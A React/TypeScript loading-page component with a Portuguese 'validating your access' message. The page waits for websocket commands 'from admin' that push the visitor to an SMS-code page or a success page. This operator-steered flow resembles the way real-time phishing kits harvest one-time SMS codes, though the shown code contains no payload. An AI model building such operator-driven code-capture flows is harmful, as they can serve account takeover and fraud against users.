import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { useSocket } from "@/hooks/useSocket";

export default function LoadingPage() {
  const [, navigate] = useLocation();
  const { socket } = useSocket();
  const [countdown, setCountdown] = useState(3); // Simulated delay of 3 seconds

  useEffect(() => {
    // Listen for websocket messages from admin
    const handleSocketMessage = (event: MessageEvent) => {
      try {
        const message = JSON.parse(event.data);
        
        if (message.type === "REQUEST_SMS") {
          navigate("/sms-code");
        } else if (message.type === "FINISH_SESSION") {
          navigate("/success");
        }
      } catch (err) {
        console.error("Error parsing socket message:", err);
      }
    };

    if (socket) {
      socket.addEventListener("message", handleSocketMessage);
    }

    // Fallback timer (in case no websocket messages are received)
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      if (socket) {
        socket.removeEventListener("message", handleSocketMessage);
      }
      clearInterval(timer);
    };
  }, [socket, navigate]);

  return (
    <div className="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center">
      <div className="flex flex-col items-center">
        <div className="animate-spin mb-4">
          <svg className="w-12 h-12 text-primary" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
          </svg>
        </div>
        <p className="text-xl font-medium text-gray-800">Aguarde enquanto validamos o seu acesso...</p>
      </div>
    </div>
  );
}
